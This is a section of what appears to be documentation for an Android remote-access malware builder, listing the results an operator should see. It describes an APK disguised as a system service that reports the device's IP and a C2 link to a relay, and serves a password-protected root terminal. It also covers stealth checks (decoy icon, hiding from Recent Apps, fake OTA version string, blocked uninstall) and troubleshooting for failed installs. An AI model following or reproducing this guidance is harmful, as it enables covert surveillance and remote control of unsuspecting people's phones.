# 17 — Expected results

## Build succeeds

    $ ls apk-builder/output/
    System-Stability-Service-v1.6-signed.apk

- `apksigner verify output/*.apk` returns clean
- `aapt dump badging` shows the chosen label and package ID
- Exit code 0, no `BUILD FAILED`, no AAPT2 138/SIGBUS

## Check-in arrives

A row appears in the sheet/relay within ~5 seconds of first launch:

| Timestamp | Model # | Connection Type | IP Address | Port | Active C2 Link | Battery | Stealth Status | Power | Free Storage |
|---|---|---|---|---|---|---|---|---|---|
| 2026-11-21 14:02:11 | SM-F966B | WiFi | 2a01:... | 9191 | http://[2a01:...]:9191 | 78% | ACTIVE | Discharging | 41 GB |

`Handshake_Pending` in the link column means the service started but the GUA lookup
failed — the relay still works.

## Dashboard responds

- Login page loads at `http://[gua]:9191`
- Correct password yields the Terminal tab with `root@Android` prompt and a populated
  `help` menu
- Device info, battery and connection type render on the Hardware tab
- `RESTART_SERVER` returns within a few seconds

## Stealth holds

- Icon replaced by the decoy within ~5 seconds of launch
- App absent from Recent Apps
- Version string looks like a plausible OTA
- Uninstall attempt from Settings is blocked while anti-removal is enabled

## Failure signatures

| Observation | Meaning |
|---|---|
| `Java not found`, `keytool not found` | JRE only, or JDK not on PATH |
| `APK Not Signed` | No keystore — run option 1 or 2 |
| "App not installed" | Signature collision — uninstall the old copy |
| Install OK, nothing happens | App never opened |
| Row never appears | Wrong webhook URL, or no outbound network |
| Dashboard loads, controls time out | Service died — `RESTART_SERVER` |
| Icon never swaps | Decoy activity failed — check logcat for `DecoyActivity` |
